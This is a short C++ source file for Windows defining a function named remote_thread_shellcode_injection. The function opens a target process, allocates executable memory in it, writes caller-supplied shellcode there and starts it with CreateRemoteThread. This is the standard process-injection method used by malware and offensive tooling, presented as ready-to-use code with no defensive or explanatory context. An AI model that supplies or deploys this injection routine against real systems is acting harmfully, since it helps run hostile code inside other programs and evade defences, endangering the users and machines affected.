#include "pch.h"


int remote_thread_shellcode_injection(int proc_id, const unsigned char* shellcode, size_t shellcode_size) {

	HANDLE procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, proc_id);
	if (procHandle == NULL) {
		std::cerr << "Failed to open process with error code: " << GetLastError() << std::endl;
		return 1;
	}

	LPVOID allocMemAddress = VirtualAllocEx(procHandle, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (allocMemAddress == NULL) {
		std::cerr << "Failed to allocate memory with error code: " << GetLastError() << std::endl;
		return 2;
	}

	SIZE_T bytesWritten;
	if (!WriteProcessMemory(procHandle, allocMemAddress, shellcode, shellcode_size, &bytesWritten)) {
		std::cerr << "Failed to write process memory with error code: " << GetLastError() << std::endl;
		return 3;
	}

	if (CreateRemoteThread(procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)allocMemAddress, NULL, 0, NULL) == NULL) {
		std::cerr << "Failed to create remote thread with error code: " << GetLastError() << std::endl;
		return 3;
	}

	CloseHandle(procHandle);
	return 0;
}